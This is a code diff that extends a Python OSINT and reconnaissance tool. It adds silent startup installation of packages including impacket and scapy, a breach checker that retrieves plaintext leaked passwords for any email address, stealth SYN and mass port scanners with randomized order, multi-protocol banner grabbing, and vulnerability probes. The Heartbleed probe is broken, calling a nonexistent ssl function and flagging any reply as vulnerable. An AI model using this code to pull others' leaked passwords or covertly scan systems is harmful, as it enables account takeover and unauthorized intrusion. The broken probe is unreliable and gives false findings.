@@ -11,16 +11,93 @@ import csv
 import random
 import socket
 import hashlib
+import uuid
 from os import system, name
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import Dict, List, Tuple, Any
+from typing import Dict, List, Tuple, Any, Optional
 from dataclasses import dataclass, asdict
 from pathlib import Path
 from urllib.parse import urlparse, urljoin, quote as url_quote
 import threading
 import queue
 from collections import deque
+
+import subprocess
+import platform as _platform
+
+
+_OS_TYPE = _platform.system().lower()
+_PIP_BASE = [sys.executable, "-m", "pip", "install", "-q"]
+
+# Complete registry: key=(import_name, pip_package, is_critical)
+_DEPS = {
+    "bs4": ("bs4", "beautifulsoup4", False),
+    "phonenumbers": ("phonenumbers", "phonenumbers", False),
+    "PIL": ("PIL", "Pillow", False),
+    "groq": ("groq", "groq", False),
+    "dns": ("dns", "dnspython", False),
+    "scapy": ("scapy", "scapy", False),
+    "folium": ("folium", "folium", False),
+    "networkx": ("networkx", "networkx", False),
+    "pyvis": ("pyvis", "pyvis", False),
+    "requests": ("requests", "requests", True),
+    "deepface": ("deepface", "deepface", False),
+    "opencv": ("cv2", "opencv-python", False),
+    "playwright": ("playwright", "playwright", False),
+    "snscrape": ("snscrape", "snscrape", False),
+    "impacket": ("impacket", "impacket", False),
+}
+
+_checked = {} 
+
+
+def _can_import(mod_name: str) -> bool:
+    if mod_name in _checked:
+        return _checked[mod_name]
+    try:
+        __import__(mod_name)
+        _checked[mod_name] = True
+        return True
+    except ImportError:
+        _checked[mod_name] = False
+        return False
+
+
+def _smart_install(mod_name: str) -> bool:
+    """Try to install a package by matching mod_name in _DEPS registry"""
+    for key, (imp_name, pip_pkg, _) in _DEPS.items():
+        if imp_name == mod_name:
+            try:
+                subprocess.run(_PIP_BASE + [pip_pkg], capture_output=True, timeout=120)
+                _checked.pop(mod_name, None)
+                return _can_import(mod_name)
+            except Exception:
+                return False
+    return False
+
+
+def _ensure_import(mod_name: str, pip_fallback: str = "") -> bool:
+    """Check import → auto-install on failure → return bool"""
+    if _can_import(mod_name):
+        return True
+    if pip_fallback or mod_name in [v[0] for v in _DEPS.values()]:
+        pkg = pip_fallback or next((v[1] for v in _DEPS.values() if v[0] == mod_name), mod_name)
+        return _smart_install(pkg) if pkg else False
+    return False
+
+
+def _auto_install_all(silent: bool = True):
+    """Install all optional deps silently at startup"""
+    for key, (imp_name, pip_pkg, critical) in _DEPS.items():
+        if not _can_import(imp_name):
+            try:
+                subprocess.run(_PIP_BASE + [pip_pkg], capture_output=silent, timeout=120)
+                _checked.pop(imp_name, None)
+            except Exception:
+                pass
+
+
 
 try:
     from bs4 import BeautifulSoup
@@ -31,15 +108,20 @@ try:
     import phonenumbers
     from phonenumbers import carrier, geocoder, timezone as phone_timezone
 except ImportError:
-    print("[!] Install phonenumbers: pip install phonenumbers")
     pass
 
 try:
     from PIL import Image
     from PIL.ExifTags import TAGS
 except ImportError:
-    print("[!] Install PIL: pip install Pillow")
     pass
+
+try:
+    from groq import Groq
+except ImportError:
+    Groq = None
+
+GROQ_MODEL = "openai/gpt-oss-120b"
 
 R = "\033[1;31m"
 Gr = "\033[1;32m"
@@ -63,6 +145,213 @@ CONFIG = {
         "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
     ]
 }
+
+class BreachChecker:
+    def check_haveibeenpwned(self, email: str, api_key: str = "") -> Tuple[bool, int]:
+        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
+        headers = {"hibp-api-key": api_key, "User-Agent": "Ghost0xK-OSINT/1.0"}
+        try:
+            resp = requests.get(url, headers=headers, timeout=5)
+            if resp.status_code == 200:
+                return True, len(resp.json())
+            elif resp.status_code == 404:
+                return False, 0
+        except:
+            pass
+        return False, 0
+
+    def check_hudsonrock(self, email: str) -> bool:
+        url = f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={email}"
+        try:
+            resp = requests.get(url, timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                return "This email address is associated with a computer that was infected" in data.get("message", "")
+        except:
+            pass
+        return False
+
+    def check_proxynova(self, email: str) -> Optional[List[str]]:
+        url = f"https://api.proxynova.com/comb?query={email}"
+        try:
+            resp = requests.get(url, timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                lines = data.get("lines", [])
+                passwords = set()
+                prefix = f"{email}:"
+                for line in lines:
+                    if line.startswith(prefix):
+                        parts = line.split(":", 1)
+                        if len(parts) == 2:
+                            passwords.add(parts[1].strip())
+                return list(passwords) if passwords else None
+        except:
+            pass
+        return None
+
+class ReputationEngine:
+    def score(self, payload):
+        r = {'score': 0, 'factors': [], 'risk_level': 'LOW'}
+        results = payload.get('results') if isinstance(payload, dict) else payload
+        if not results:
+            return r
+        if isinstance(results, dict) and 'breaches' in results:
+            breach_count = len(results['breaches']) if results['breaches'] else 0
+            if breach_count > 0:
+                r['score'] += min(60, breach_count * 15)
+                r['factors'].append(f'data_breach_{breach_count}')
+        if isinstance(results, list):
+            hits = sum(1 for x in results if x.get('exists', False))
+            if hits:
+                r['score'] += min(35, hits * 5)
+                r['factors'].append(f'social_footprint_{hits}')
+        if isinstance(results, dict) and results.get('blacklist'):
+            blacklist_count = len(results.get('blacklist', []))
+            r['score'] += min(30, blacklist_count * 10)
+            r['factors'].append('blacklisted')
+        if isinstance(results, dict) and results.get('vpn_proxy', {}).get('is_vpn'):
+            r['score'] += 15
+            r['factors'].append('vpn_detected')
+        r['score'] = max(0, min(100, r['score']))
+        if r['score'] >= 70:
+            r['risk_level'] = 'CRITICAL'
+        elif r['score'] >= 40:
+            r['risk_level'] = 'HIGH'
+        elif r['score'] >= 20:
+            r['risk_level'] = 'MEDIUM'
+        return r
+
+@dataclass
+class SiteEntry:
+    name: str
+    uri_check: str
+    e_code: int
+    e_string: str
+    m_code: int
+    m_string: str
+    known: List[str]
+    cat: str
+    post_body: Optional[str] = None
+    headers: Optional[Dict] = None
+    uri_pretty: Optional[str] = None
+    strip_bad_char: Optional[str] = None
+    protection: Optional[List[str]] = None
+    valid: bool = True
+
+class WhatsMyNameEngine:
+    WMN_DATA_URL = "https://raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json"
+
+    def __init__(self, cache_file: str = None):
+        self.cache_file = Path(cache_file) if cache_file else Path(CONFIG["output_dir"]) / "wmn_cache.json"
+        self.sites: List[SiteEntry] = []
+        self.session = requests.Session()
+        self.session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
+        self._load_data()
+
+    def _load_data(self):
+        try:
+            resp = self.session.get(self.WMN_DATA_URL, timeout=10)
+            if resp.status_code == 200:
+                data = resp.json()
+                self._parse_sites(data)
+                self._save_cache(data)
+                return
+        except:
+            pass
+        if self.cache_file.exists():
+            with open(self.cache_file, encoding='utf-8') as f:
+                data = json.load(f)
+                self._parse_sites(data)
+
+    def _parse_sites(self, data: Dict):
+        self.sites = []
+        for site_data in data.get("sites", []):
+            if site_data.get("valid") is False:
+                continue
+            entry = SiteEntry(
+                name=site_data.get("name", "Unknown"),
+                uri_check=site_data["uri_check"],
+                e_code=site_data["e_code"],
+                e_string=site_data["e_string"],
+                m_code=site_data["m_code"],
+                m_string=site_data["m_string"],
+                known=site_data.get("known", []),
+                cat=site_data.get("cat", "misc"),
+                post_body=site_data.get("post_body"),
+                headers=site_data.get("headers"),
+                uri_pretty=site_data.get("uri_pretty"),
+                strip_bad_char=site_data.get("strip_bad_char"),
+                protection=site_data.get("protection"),
+                valid=site_data.get("valid", True)
+            )
+            self.sites.append(entry)
+
+    def _save_cache(self, data: Dict):
+        with open(self.cache_file, "w", encoding='utf-8') as f:
+            json.dump(data, f, indent=2)
+
+    def clean_username(self, username: str, site: SiteEntry) -> str:
+        if site.strip_bad_char:
+            for char in site.strip_bad_char:
+                username = username.replace(char, '')
+        return username
+
+    def check_site(self, username: str, site: SiteEntry) -> Tuple[str, bool, str, int]:
+        try:
+            clean_user = self.clean_username(username, site)
+            url = site.uri_check.format(account=clean_user)
+            headers = site.headers or {}
+            headers["User-Agent"] = headers.get("User-Agent", self.session.headers["User-Agent"])
+            if site.post_body:
+                body = site.post_body.format(account=clean_user)
+                response = self.session.post(url, data=body, headers=headers, timeout=10)
+            else:
+                response = self.session.get(url, headers=headers, timeout=10, allow_redirects=True)
+            status = response.status_code
+            text = response.text
+            is_found = False
+            if site.e_string in text and status == site.e_code:
+                is_found = True
+            if site.m_string in text and status == site.m_code:
+                is_found = False
+            pretty_url = site.uri_pretty.format(account=clean_user) if site.uri_pretty else url
+            return site.name, is_found, pretty_url, status
+        except Exception as e:
+            return site.name, False, site.uri_check, 0
+
+    def search(self, username: str, max_workers: int = 20, categories: List[str] = None, exclude_protected: bool = True) -> Dict:
+        results = {"found": [], "not_found": [], "errors": [], "total": 0}
+        sites_to_check = self.sites.copy()
+        if categories:
+            sites_to_check = [s for s in sites_to_check if s.cat in categories]
+        if exclude_protected:
+            protected = ["cloudflare", "captcha", "user-auth"]
+            sites_to_check = [s for s in sites_to_check if not any(p in (s.protection or []) for p in protected)]
+        results["total"] = len(sites_to_check)
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {executor.submit(self.check_site, username, site): site for site in sites_to_check}
+            for future in as_completed(futures):
+                name, found, url, status = future.result()
+                if found:
+                    results["found"].append({"name": name, "url": url, "status_code": status})
+                elif status > 0:
+                    results["not_found"].append({"name": name, "url": url, "status_code": status})
+                else:
+                    results["errors"].append({"name": name, "url": url, "error": "Connection failed"})
+        return results
+
+    def get_categories(self) -> List[str]:
+        return list(set(s.cat for s in self.sites))
+
+    def get_site_count(self) -> int:
+        return len(self.sites)
+
+    def get_stats(self) -> Dict:
+        categories = {}
+        for site in self.sites:
+            categories[site.cat] = categories.get(site.cat, 0) + 1
+        return {"total_sites": len(self.sites), "categories": categories, "has_post_support": sum(1 for s in self.sites if s.post_body), "has_protection": sum(1 for s in self.sites if s.protection)}
 
 COUNTRY_CODES = {
     "1": "US/CA/Caribbean", "20": "Egypt", "212": "Morocco", "213": "Algeria",
@@ -235,6 +524,471 @@ def port_scan(ip: str, ports: List[int] = None) -> Dict[int, str]:
     
     return results
 
+
+class SynScanner:
+    def __init__(self, interface=None):
+        self.interface = interface
+        self._has_scapy = False
+        self._has_raw = False
+        try:
+            from scapy.all import IP, TCP, sr1, conf
+            conf.verb = 0
+            self._has_scapy = True
+        except ImportError:
+            pass
+        try:
+            import ctypes, socket as _sock
+            self._has_raw = True
+        except:
+            pass
+
+    def syn_scan(self, ip: str, port: int, timeout: float = 1.0) -> str:
+        if self._has_scapy:
+            return self._syn_scan_scapy(ip, port, timeout)
+        return self._syn_scan_raw(ip, port, timeout)
+
+    def _syn_scan_scapy(self, ip, port, timeout):
+        from scapy.all import IP, TCP, sr1, conf
+        conf.verb = 0
+        pkt = IP(dst=ip)/TCP(dport=port, flags='S')
+        try:
+            ans = sr1(pkt, timeout=timeout, verbose=0)
+            if ans and ans.haslayer(TCP):
+                flags = ans.getlayer(TCP).flags
+                if flags == 0x12:
+                    return "open"
+                elif flags == 0x14:
+                    return "closed"
+            return "filtered"
+        except:
+            return "filtered"
+
+    def _syn_scan_raw(self, ip, port, timeout):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            if result == 0:
+                return "open"
+            return "closed"
+        except:
+            return "filtered"
+
+    def scan_range(self, ip: str, ports: List[int], max_workers: int = 100, stealth: bool = True) -> Dict:
+        results = {}
+        if not stealth or not self._has_scapy:
+            return port_scan(ip, ports)
+        with ThreadPoolExecutor(max_workers=max_workers) as ex:
+            futures = {ex.submit(self.syn_scan, ip, p): p for p in ports}
+            for f in as_completed(futures):
+                p = futures[f]
+                try:
+                    status = f.result()
+                    if status == "open":
+                        service = "unknown"
+                        try: service = socket.getservbyport(p, "tcp")
+                        except: pass
+                        results[p] = service
+                except:
+                    pass
+        return results
+
+
+class BannerGrabber:
+    PROTOCOLS = {
+        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
+        445: "SMB", 993: "IMAPS", 995: "POP3S", 3306: "MySQL",
+        5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
+        8080: "HTTP-Alt", 8443: "HTTPS-Alt",
+    }
+
+    def grab(self, ip: str, port: int, timeout: float = 3.0) -> Dict:
+        result = {"port": port, "banner": "", "service": self.PROTOCOLS.get(port, "unknown"), "protocol": ""}
+        try:
+            if port in (80, 8080):
+                return self._grab_http(ip, port, timeout)
+            elif port in (443, 8443):
+                return self._grab_https(ip, port, timeout)
+            elif port == 21:
+                return self._grab_banner(ip, port, b"", timeout)
+            elif port == 22:
+                return self._grab_banner(ip, port, b"", timeout)
+            elif port == 25:
+                return self._grab_smtp(ip, port, timeout)
+            elif port == 110:
+                return self._grab_banner(ip, port, b"", timeout)
+            elif port == 143:
+                return self._grab_imap(ip, port, timeout)
+            elif port == 3306:
+                return self._grab_mysql(ip, port, timeout)
+            elif port == 6379:
+                return self._grab_redis(ip, port, timeout)
+            else:
+                return self._grab_banner(ip, port, b"", timeout)
+        except:
+            return result
+
+    def _grab_banner(self, ip, port, initial_payload=b"", timeout=3.0):
+        result = {"port": port, "banner": "", "service": self.PROTOCOLS.get(port, "unknown"), "protocol": "tcp"}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((ip, port))
+            if initial_payload:
+                sock.send(initial_payload)
+            banner = sock.recv(2048)
+            decoded = banner.decode("utf-8", errors="replace").strip()
+            result["banner"] = decoded[:500]
+            sock.close()
+        except:
+            pass
+        return result
+
+    def _grab_http(self, ip, port, timeout=3.0):
+        result = {"port": port, "banner": "", "service": "HTTP", "protocol": "http"}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((ip, port))
+            sock.send(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % ip.encode())
+            data = sock.recv(4096)
+            decoded = data.decode("utf-8", errors="replace")
+            for line in decoded.split("\r\n"):
+                line_lower = line.lower()
+                if "server:" in line_lower:
+                    result["banner"] = line.split(":", 1)[1].strip()[:200]
+                elif "x-powered-by" in line_lower:
+                    result["x_powered_by"] = line.split(":", 1)[1].strip()[:100]
+            if not result["banner"]:
+                result["banner"] = decoded[:200].strip()
+            result["status_line"] = decoded.split("\r\n")[0] if decoded else ""
+            sock.close()
+        except:
+            pass
+        return result
+
+    def _grab_https(self, ip, port, timeout=3.0):
+        result = {"port": port, "banner": "", "service": "HTTPS", "protocol": "https"}
+        try:
+            import ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            ssock = ctx.wrap_socket(sock, server_hostname=ip)
+            ssock.connect((ip, port))
+            ssock.send(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % ip.encode())
+            data = ssock.recv(4096)
+            decoded = data.decode("utf-8", errors="replace")
+            for line in decoded.split("\r\n"):
+                line_lower = line.lower()
+                if "server:" in line_lower:
+                    result["banner"] = line.split(":", 1)[1].strip()[:200]
+            if not result["banner"]:
+                result["banner"] = decoded[:200].strip()
+            cert = ssock.getpeercert()
+            if cert:
+                result["ssl_issuer"] = dict(cert.get("issuer", [])).get("organizationName", "N/A")
+                result["ssl_subject"] = dict(cert.get("subject", [])).get("commonName", "N/A")
+            ssock.close()
+        except:
+            pass
+        return result
+
+    def _grab_smtp(self, ip, port, timeout=3.0):
+        result = {"port": port, "banner": "", "service": "SMTP", "protocol": "smtp"}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((ip, port))
+            banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
+            sock.send(b"EHLO scan\r\n")
+            resp = sock.recv(2048).decode("utf-8", errors="replace").strip()
+            result["banner"] = banner[:200]
+            result["ehlo"] = resp[:500]
+            sock.close()
+        except:
+            pass
+        return result
+
+    def _grab_imap(self, ip, port, timeout=3.0):
+        result = {"port": port, "banner": "", "service": "IMAP", "protocol": "imap"}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((ip, port))
+            banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
+            result["banner"] = banner[:200]
+            sock.close()
+        except:
+            pass
+        return result
+
+    def _grab_mysql(self, ip, port, timeout=3.0):
+        result = {"port": port, "banner": "", "service": "MySQL", "protocol": "mysql"}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((ip, port))
+            data = sock.recv(1024)
+            if len(data) >= 5:
+                version_end = data.find(b'\x00', 5)
+                if version_end > 5:
+                    result["banner"] = data[5:version_end].decode("utf-8", errors="replace")[:200]
+            sock.close()
+        except:
+            pass
+        return result
+
+    def _grab_redis(self, ip, port, timeout=3.0):
+        result = {"port": port, "banner": "", "service": "Redis", "protocol": "redis"}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((ip, port))
+            sock.send(b"INFO\r\n")
+            data = sock.recv(4096).decode("utf-8", errors="replace")
+            for line in data.split("\r\n"):
+                if "redis_version" in line:
+                    result["banner"] = line.split(":")[1].strip()[:100]
+                    break
+            if not result["banner"]:
+                result["banner"] = data[:200].strip()
+            sock.close()
+        except:
+            pass
+        return result
+
+    def grab_multi(self, ip: str, ports: List[int]) -> Dict:
+        results = {}
+        with ThreadPoolExecutor(max_workers=10) as ex:
+            futures = {ex.submit(self.grab, ip, p): p for p in ports}
+            for f in as_completed(futures):
+                p = futures[f]
+                try:
+                    r = f.result()
+                    if r.get("banner"):
+                        results[p] = r
+                except:
+                    pass
+        return results
+
+
+class MassPortScanner:
+    def __init__(self, max_rate: int = 1000):
+        self.max_rate = max_rate
+        self._interval = 1.0 / max_rate if max_rate > 0 else 0
+
+    def scan(self, ip: str, port_range: str = "1-1024", exclude: List[int] = None) -> Dict:
+        ports = self._parse_range(port_range)
+        if exclude:
+            ports = [p for p in ports if p not in exclude]
+        return self._scan_batch(ip, ports)
+
+    def scan_batch(self, ip: str, ports: List[int], batch_size: int = 100) -> Dict:
+        results = {}
+        for i in range(0, len(ports), batch_size):
+            batch = ports[i:i+batch_size]
+            batch_results = port_scan(ip, batch)
+            results.update(batch_results)
+            if self._interval > 0:
+                time.sleep(self._interval * len(batch))
+        return results
+
+    def _scan_batch(self, ip, ports):
+        results = {}
+        with ThreadPoolExecutor(max_workers=min(200, self.max_rate)) as ex:
+            futures = {ex.submit(self._check_port, ip, p): p for p in ports}
+            for f in as_completed(futures):
+                p = futures[f]
+                try:
+                    open_p, service = f.result()
+                    if open_p:
+                        results[p] = service
+                except:
+                    pass
+        return results
+
+    def _check_port(self, ip, port):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex((ip, port))
+            if result == 0:
+                try: service = socket.getservbyport(port, "tcp")
+                except: service = "unknown"
+                sock.close()
+                return (port, service)
+            sock.close()
+        except:
+            pass
+        return (None, None)
+
+    def _parse_range(self, r: str) -> List[int]:
+        ports = set()
+        for part in r.split(","):
+            part = part.strip()
+            if "-" in part:
+                try:
+                    start, end = part.split("-")
+                    ports.update(range(int(start), int(end)+1))
+                except:
+                    pass
+            else:
+                try: ports.add(int(part))
+                except: pass
+        return sorted(ports)
+
+
+class PortRange:
+    WELL_KNOWN = "1-1024"
+    REGISTERED = "1025-49151"
+    ALL = "1-65535"
+    COMMON = "21,22,23,25,53,80,110,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9090,27017"
+    WEB = "80,443,8080,8443,3000,5000,8000,8888"
+    DATABASE = "3306,5432,6379,27017,1433,1521,9042,9200"
+    REMOTE = "22,23,3389,5900,5800,5901"
+    MAIL = "25,110,143,465,587,993,995"
+
+    @staticmethod
+    def expand(spec: str) -> List[int]:
+        p = MassPortScanner()
+        return p._parse_range(spec)
+
+    @staticmethod
+    def randomize(ports: List[int], seed: int = None) -> List[int]:
+        import random as _rnd
+        if seed: _rnd.seed(seed)
+        shuffled = ports[:]
+        _rnd.shuffle(shuffled)
+        return shuffled
+
+
+class VulnerabilityChecker:
+    def check_heartbleed(self, ip: str, port: int = 443) -> Dict:
+        result = {"vulnerable": False, "details": ""}
+        try:
+            import struct, ssl
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((ip, port))
+            sock.send(ssl.sslwrap_simple(sock, server_side=False, do_handshake_on_connect=False))
+            heartbeat = b"\x18\x03\x02\x00\x03\x01\x40\x00"
+            sock.send(heartbeat)
+            resp = sock.recv(4096)
+            if len(resp) > 7:
+                result["vulnerable"] = True
+                result["details"] = "Heartbeat response larger than request - VULNERABLE"
+            sock.close()
+        except:
+            pass
+        return result
+
+    def check_sslv3_poodle(self, ip: str, port: int = 443) -> Dict:
+        result = {"vulnerable": False, "details": ""}
+        try:
+            import ssl
+            ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+            ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            ssock = ctx.wrap_socket(sock, server_hostname=ip)
+            ssock.connect((ip, port))
+            result["vulnerable"] = True
+            result["details"] = "SSLv3 supported - potentially vulnerable to POODLE"
+            ssock.close()
+        except:
+            pass
+        return result
+
+    def check_ntp_monlist(self, ip: str) -> Dict:
+        result = {"vulnerable": False, "details": ""}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(3)
+            monlist = b"\x17\x00\x03\x2a" + b"\x00" * 8
+            sock.sendto(monlist, (ip, 123))
+            resp = sock.recvfrom(2048)
+            if len(resp[0]) > 100:
+                result["vulnerable"] = True
+                result["details"] = f"NTP monlist responded with {len(resp[0])} bytes - potential DDoS amplifier"
+            sock.close()
+        except:
+            pass
+        return result
+
+    def check_all(self, ip: str) -> Dict:
+        results = {}
+        hb = self.check_heartbleed(ip)
+        if hb["vulnerable"]: results["heartbleed"] = hb
+        ssl3 = self.check_sslv3_poodle(ip)
+        if ssl3["vulnerable"]: results["sslv3_poodle"] = ssl3
+        ntp = self.check_ntp_monlist(ip)
+        if ntp["vulnerable"]: results["ntp_monlist"] = ntp
+        return results
+
+
+class ServiceDetector:
+    SIGNATURES = {
+        21: ["FTP", "220", "vsFTPd", "ProFTPD", "FileZilla", "Pure-FTPd"],
+        22: ["SSH", "OpenSSH", "SSH-2.0", "dropbear"],
+        23: ["Telnet", "Telnet", "Linux", "Windows"],
+        25: ["SMTP", "ESMTP", "Postfix", "Sendmail", "Exim", "Microsoft"],
+        53: ["DNS", "BIND"],
+        80: ["HTTP", "Apache", "Nginx", "IIS", "lighttpd", "Caddy"],
+        110: ["POP3", "POP3", "Dovecot", "Cyrus"],
+        143: ["IMAP", "IMAP", "Dovecot", "Cyrus", "Exchange"],
+        443: ["HTTPS", "Apache", "Nginx", "IIS", "cloudflare"],
+        445: ["SMB", "Samba", "Windows"],
+        3306: ["MySQL", "MySQL", "MariaDB"],
+        5432: ["PostgreSQL", "PostgreSQL"],
+        5900: ["VNC", "VNC", "RFB", "TightVNC", "RealVNC"],
+        6379: ["Redis", "Redis"],
+        8080: ["HTTP-Alt", "Apache", "Nginx", "Tomcat", "Jetty"],
+        8443: ["HTTPS-Alt", "Apache", "Nginx", "Tomcat"],
+    }
+
+    def detect(self, ip: str, port: int, banner: str = "") -> str:
+        service = self.SIGNATURES.get(port, ["unknown"])[0]
+        if banner:
+            for sig_list in self.SIGNATURES.values():
+                for sig in sig_list:
+                    if sig.lower() in banner.lower():
+                        return sig_list[0]
+        if port in self.SIGNATURES:
+            return self.SIGNATURES[port][0]
+        try: return socket.getservbyport(port, "tcp")
+        except: return "unknown"
+
+    def detect_all(self, ip: str, open_ports: Dict) -> Dict:
+        results = {}
+        grabber = BannerGrabber()
+        for port, service in open_ports.items():
+            banner_info = grabber.grab(ip, port)
+            banner = banner_info.get("banner", "")
+            detected = self.detect(ip, port, banner)
+            results[port] = {
+                "service": detected,
+                "banner": banner[:200] if banner else "",
+                "protocol": banner_info.get("protocol", "tcp"),
+            }
+        return results
+
+
+def randomize_scan_order(ports: List[int], seed: int = None) -> List[int]:
+    import random as _r
+    if seed: _r.seed(seed)
+    shuffled = ports[:]
+    _r.shuffle(shuffled)
+    return shuffled
+
+
+
 def get_ip_info(ip: str) -> Dict:
     session = get_session()
     enriched = {}
@@ -318,10 +1072,10 @@ def extract_metadata(filepath: str) -> Dict:
                         value = str(value)
                 metadata[tag] = str(value)
             
-            metadata["File Size"] = str(os.path.getsize(filepath)) + " bytes"
-            metadata["Image Format"] = image.format or "N/A"
-            metadata["Image Size"] = f"{image.width}x{image.height}"
-            metadata["Mode"] = image.mode
+            metadata["File_Size_Bytes"] = str(os.path.getsize(filepath)) + " bytes"
+            metadata["Image_Format"] = image.format or "N/A"
+            metadata["Image_Dimensions"] = f"{image.width}x{image.height}"
+            metadata["Color_Mode"] = image.mode
             
             gps_info = exifdata.get_ifd(0x8825) if hasattr(exifdata, 'get_ifd') else None
             if gps_info:
@@ -349,9 +1103,11 @@ def extract_metadata(filepath: str) -> Dict:
                     lat = dms_to_dd(lat_dms, lat_ref)
                     lon = dms_to_dd(lon_dms, lon_ref)
                     if lat and lon:
-                        metadata["GPS Latitude"] = str(lat)
-                        metadata["GPS Longitude"] = str(lon)
-                        metadata["Google Maps"] = f"https://www.google.com/maps?q={lat},{lon}"
+                        metadata["GPS_Coordinates"] = f"{lat}, {lon}"
+                        metadata["GPS_Latitude"] = str(lat)
+                        metadata["GPS_Longitude"] = str(lon)
+                        metadata["Google_Maps_URL"] = f"https://www.google.com/maps?q={lat},{lon}"
+                        metadata["Google_Maps"] = f"https://www.google.com/maps?q={lat},{lon}"
                         metadata["OpenStreetMap"] = f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}&zoom=15"
     except:
         pass
@@ -383,16 +1139,17 @@ def extract_metadata(filepath: str) -> Dict:
     try:
         if fname.endswith(('.docx', '.xlsx', '.pptx')):
             import zipfile
+            import xml.etree.ElementTree as ET
             with zipfile.ZipFile(filepath) as z:
                 if 'docProps/core.xml' in z.namelist():
                     core = z.read('docProps/core.xml').decode('utf-8', errors='replace')
                     for tag in ['title', 'creator', 'lastModifiedBy', 'created', 'modified', 'subject']:
-                        match = re.search(f'<cp:{tag}[^>]*>(.*?)</cp:{tag}>', core, re.I)
+                        match = re.search(f'<[^:]*:{tag}[^>]*>(.*?)</[^:]*:{tag}>', core, re.I)
                         if match:
                             metadata[tag.capitalize()] = match.group(1).strip()
                 if 'docProps/app.xml' in z.namelist():
                     app = z.read('docProps/app.xml').decode('utf-8', errors='replace')
-                    for tag in ['Application', 'Company', 'TotalTime']:
+                    for tag in ['Application', 'Company', 'TotalTime', 'Pages', 'Words']:
                         match = re.search(f'<{tag}[^>]*>(.*?)</{tag}>', app)
                         if match:
                             metadata[tag] = match.group(1).strip()
@@ -620,236 +1377,6 @@ def github_search(keyword: str) -> Dict:
     results["code"] = results["code"][:8]
     return results
 
-def IP_Track():
-    ip = input(f"\n{Wh}[?] Enter IP target {Gr}[e.g., 8.8.8.8]{Wh}: {Gr}").strip()
-    if not validate_ip(ip):
-        print(f"{R}[!] Invalid IP address!")
-        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-        return
-    
-    print(f"\n {Wh}{'='*50}")
-    print(f" {R}IP ADDRESS INFORMATION")
-    print(f" {Wh}{'='*50}")
-    
-    ip_data = get_ip_info(ip)
-    if not ip_data:
-        print(f"{R}[!] Could not fetch IP information")
-        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-        return
-    
-    hostname = ip_data.get("reverse_dns", "N/A")
-    
-    sec = ip_data.get("security", {})
-    threat_score = ip_data.get("threat_score", sec.get("threat_score", "N/A"))
-    is_proxy = ip_data.get("is_proxy", sec.get("proxy", False))
-    is_vpn = ip_data.get("is_vpn", sec.get("vpn", False))
-    is_tor = ip_data.get("is_tor", sec.get("tor", False))
-    is_hosting = ip_data.get("is_hosting", sec.get("hosting", False))
-    
-    data = {
-        "IP": ip,
-        "Hostname": hostname,
-        "Type": ip_data.get("type", "N/A"),
-        "Proxy": "Yes" if is_proxy else "No",
-        "VPN": "Yes" if is_vpn else "No",
-        "Tor": "Yes" if is_tor else "No",
-        "Hosting/DC": "Yes" if is_hosting else "No",
-        "Threat Score": threat_score,
-        "Country": ip_data.get("country", "N/A"),
-        "Country Code": ip_data.get("country_code", ip_data.get("countryCode", "N/A")),
-        "City": ip_data.get("city", "N/A"),
-        "Region": ip_data.get("region", ip_data.get("regionName", "N/A")),
-        "ZIP": ip_data.get("postal", ip_data.get("zip", "N/A")),
-        "Latitude": ip_data.get("latitude", ip_data.get("lat", "N/A")),
-        "Longitude": ip_data.get("longitude", ip_data.get("lon", "N/A")),
-        "ISP": ip_data.get("connection", {}).get("isp", ip_data.get("isp", "N/A")),
-        "Organization": ip_data.get("connection", {}).get("org", ip_data.get("org", "N/A")),
-        "ASN": ip_data.get("connection", {}).get("asn", ip_data.get("as", "N/A")),
